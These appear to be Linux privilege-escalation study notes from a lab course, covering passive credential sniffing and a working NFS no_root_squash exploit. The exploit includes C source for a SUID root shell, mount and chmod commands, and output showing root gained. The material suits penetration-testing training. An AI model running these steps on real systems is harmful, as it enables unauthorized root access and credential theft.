### Passive Traffic Capture

If *tcpdump* is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as *net-creds* and *PCredz* that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.


### Weak NFS Privileges

Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

```bash
$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:
| Option | 	Description |
| ------- | ------ |
| root_squash | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
| no_root_squash | 	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set. |

### to see all nfs partitions

```bash
$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

### Exploit ideation
For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

```bash
$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```bash
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```bash
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```bash
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```
